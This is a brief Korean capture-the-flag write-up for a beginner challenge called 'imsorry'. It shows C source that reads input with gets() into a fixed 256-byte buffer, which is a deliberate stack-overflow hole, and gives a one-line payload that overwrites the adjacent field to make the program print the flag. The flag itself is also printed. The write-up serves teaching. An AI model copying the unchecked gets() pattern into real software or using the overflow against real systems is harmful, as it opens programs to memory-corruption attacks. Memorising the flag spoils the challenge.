#imsorry

문제 : imsorry


출제의도 : buffer overflow의 개념을 알고 있는가?




```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma pack(push, 1)
typedef struct _t{
	char name[256];
	char sorry[0x10];
} t;
#pragma pack(pop)

int main(){

	t t_;

	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stderr, 0, 2, 0);

	puts("hey, its me.... im sorry:<");
	puts("tell me your name. I'll tell you how much sorry I am...");
	gets(t_.name);
	if(!strcmp("KCTFJr", t_.sorry)){
		system("cat flag");
		exit(0);
	}
	printf("I'm sorry %s\n", t_.name);
	puts("bye,,,,");
	return 0;
}
```



보면 name이라는 변수에 값을 입력받지만, 비교는 sorry라는 변수로 하고있는 것을 알 수 있다.


간단히 buffer overflow를 통해 문제를 해결할 수 있다.



*PAYLOAD*


`(python -c 'print "A"*256 + "KCTFJr"';cat) | ./imsorry`


***KCTFJr{Th@7_waZ_mAh_FaU1T.....:<}***
